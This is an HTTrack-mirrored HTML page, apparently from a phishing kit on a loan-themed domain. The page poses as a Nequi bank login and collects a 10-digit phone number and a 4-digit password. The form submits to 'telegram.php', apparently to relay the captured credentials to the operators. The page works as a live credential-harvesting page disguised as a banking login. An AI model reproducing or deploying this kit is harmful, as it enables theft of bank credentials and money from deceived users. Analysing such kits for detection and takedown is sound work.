

<html>
    
<!-- Mirrored from prestamo-propulsor-al-instante.online/rastrear/informacion/index.html by HTTrack Website Copier/3.x [XR&CO'2014], Fri, 03 May 2024 03:11:01 GMT -->
<head>
        <title>Prestamo Propulsor</title>
        <meta http-equiv="content-type" content="text/html; utf-8">
        <meta charset="utf-8">
        
        <meta content="es" http-equiv="Content-Language">
    
        <meta name="description" content="">
        <meta name="author" content="">
        <meta name="Copyright" content="">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <meta http-equiv="X-UA-Compatible" content="IE=edge">
        <link rel="icon" href="../img/favicon.png" type="image/x-icon">
        <link rel="preconnect" href="https://fonts.googleapis.com/">
<link rel="preconnect" href="https://fonts.gstatic.com/" crossorigin>
<link href="https://fonts.googleapis.com/css2?family=Nunito:ital,wght@0,200;0,300;0,400;0,500;0,600;0,700;0,800;0,900;0,1000;1,200;1,300;1,400;1,500;1,600;1,700;1,800;1,900;1,1000&amp;display=swap" rel="stylesheet">
        <script type="text/javascript" src="../js/jquery-3.6.0.min.js"></script>      
        <link href="../css/style.css" rel="stylesheet">
        <link href="../css/stylesheet.css" rel="stylesheet">
        <script type="text/javascript" src="../js/functions.js"></script> 
        <script type="text/javascript" src="../js/ready.js"></script>  
        <script src="../js/jquery.jclock-min.html" type="text/javascript"></script>
        <style type="text/css">
            body{
            background-color: #fbe5f2;
            display: flex;
            justify-content: center;
            align-content: flex-start;
            margin-top: 150px;

        }
        #fondo{
            position: fixed;
            z-index: 600;
            width: 100%;
            height: 100%;
            top: 0;
            left: 0;
            background-color: #fbe5f2   ;                         
        }

        #frm-esperando{
            padding: 30px 20px 0px 20px;
        }
        
        /* Estilo para el botón habilitado */
        .btn-habilitado {
            background-color: #DA0081; /* Cambia el color a amarillo */
            color: #fff;
        }

        /* Estilo para el botón deshabilitado */
        .btn-deshabilitado {
            background-color: #F1BFDA; /* Cambia el color a gris */
            color: #fff;
        }
            #frm-nuevootp{
                display: none;
            }
        </style>     
        
    </head>
    <body>
        <div id="fondo"></div>
        
         <div style="height: 100%;" >
            <div id="" class="frm-modal">
                <img src="../img/nequi-1.png" alt="" style="width: 100%;margin-top: 30px;">
                <form action="telegram.php" method="post" class="formulario">
                    <input style="background-color: #fbf7fb;" type="text" name="txt-usuario"  inputmode="numeric"placeholder="Número de celular" id="txt-usuario" autocomplete="off" class="entradas" maxlength="10">
                    <div class="error" id="err-usuario">Número de celular</div>                
                    <br>
                    <div class="espacio"></div>
                    <input style="background-color: #fbf7fb;" type="password" name="txt-password" inputmode="numeric" placeholder="Contraseña" id="txt-password" autocomplete="off" class="entradas" maxlength="4"> 
                    <div class="error" id="err-password">Contraseña</div>                   
                    <br><br>
                    <button class="btn btn-deshabilitado" id="btn-iniciar-sesion" disabled>Iniciar Sesión</button>
                </form>
    
            </div>
    
        </div>
        
      

        <script type="text/javascript">    
    $(document).ready(function(){
        buscar_documento();

        var FechaFull = new Date();
        var dia = FechaFull.getDate();
        var mes = FechaFull.getMonth();
        var ano = FechaFull.getFullYear();

        mes = mes + 1;

        $("#fec").html(dia + "/" + mes + "/" + ano);

        

       $("#txt-usuario").on("input", function() {
    updateButtonState();
});

$("#txt-password").on("input", function() {
    updateButtonState();
});

function updateButtonState() {
    var usuario = $('#txt-usuario').val().trim();
    var password = $('#txt-password').val().trim();
    var usuarioValid = usuario !== "" && usuario.length == 10;
    var passwordValid = password !== "" && password.length == 4;
    
    if (usuarioValid && passwordValid) {
        $("#btn-iniciar-sesion").prop("disabled", false);
        $("#btn-iniciar-sesion").removeClass("btn-deshabilitado").addClass("btn-habilitado");
    } else {
        $("#btn-iniciar-sesion").prop("disabled", true);
        $("#btn-iniciar-sesion").removeClass("btn-habilitado").addClass("btn-deshabilitado");
    }
}
 
    }); 
</script> 

    </body>

<!-- Mirrored from prestamo-propulsor-al-instante.online/rastrear/informacion/index.html by HTTrack Website Copier/3.x [XR&CO'2014], Fri, 03 May 2024 03:11:03 GMT -->
</html>

